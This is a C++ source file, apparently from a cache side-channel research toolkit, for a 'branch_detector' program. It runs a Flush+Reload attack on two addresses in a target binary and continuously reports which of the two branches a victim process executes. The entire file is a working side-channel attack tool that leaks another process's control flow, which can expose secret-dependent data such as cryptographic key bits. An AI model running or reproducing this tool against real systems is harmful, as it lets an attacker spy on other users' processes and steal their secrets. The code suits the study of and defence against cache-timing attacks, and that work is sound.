#include "../lib/attack/attack_manager.hpp"
#include "../lib/sampling/sampler_primitives.hpp"
#include "../lib/sampling/samplers/average_sampler.hpp"
#include "../lib/sampling/samplers/list_sampler.hpp"
#include "../lib/utils/memory_wrapper.hpp"
#include "../main/utils/cacheutils.h"
#include "../main/utils/intel.h"
#include <iostream>


const size_t SAMPLE_MEASURE_DELAY = 500000;
const size_t BETWEEN_ITEMS_DELAY = 500000;
const size_t BETWEEN_ROUNDS_DELAY = 500000;
const size_t SAMPLE_ROUNDS = 100;
const double MIN_SCORE = 1.0;


AttackManager GetAttack(const std::string& path, size_t first_index, size_t second_index)
{
  auto indices = { first_index, second_index };
  auto primitive = std::make_unique<FlushSamplerPrimitive>();
  auto sampler = std::make_unique<ListSampler>(indices, SAMPLE_MEASURE_DELAY, BETWEEN_ITEMS_DELAY,
                                               std::move(primitive));
  auto average_sampler =
    std::make_unique<AverageSampler>(std::move(sampler), SAMPLE_ROUNDS, BETWEEN_ROUNDS_DELAY);

  AttackManager attack(MemoryWrapper(path), AttackType::FlushReload, std::move(average_sampler));

  attack.Calibrate();
  return attack;
}

#define LIMIT 220


int main(int argc, char* argv[])
{
  if (argc < 4)
  {
    std::cout << "Usage: branch_detector file addr0 addr1" << std::endl;
    return 1;
  }

  char* path = argv[1];
  int addr0 = std::strtol(argv[2], nullptr, 16);
  int addr1 = std::strtol(argv[3], nullptr, 16);

  if (addr0 <= 0 || addr1 <= 0)
  {
    std::cout << "Usage: branch_detector file addr0 addr1" << std::endl;
    return 1;
  }

  AttackManager attack = GetAttack(path, addr0, addr1);

  uint total0 = 0;
  uint total1 = 0;
  std::vector<Measurement> measurements;
  std::vector<AttackResult> results;
  while (true)
  {
    measurements.clear();
    results.clear();
    attack.Attack(measurements, results);
    for (const AttackResult& result : results)
    {
      if (result.index == addr0 && result.score >= MIN_SCORE)
      {
        std::cout << "Case 0 triggered with score: " << result.score << " Total: 0s: " << total0
                  << " 1s: " << total1 << std::endl;
        total0++;
      }
      else if (result.index == addr1 && result.score >= MIN_SCORE)
      {
        std::cout << "Case 1 triggered with score: " << result.score << " Total: 0s: " << total0
                  << " 1s: " << total1 << std::endl;
        total1++;
      }
    }
  }
  return 0;
}
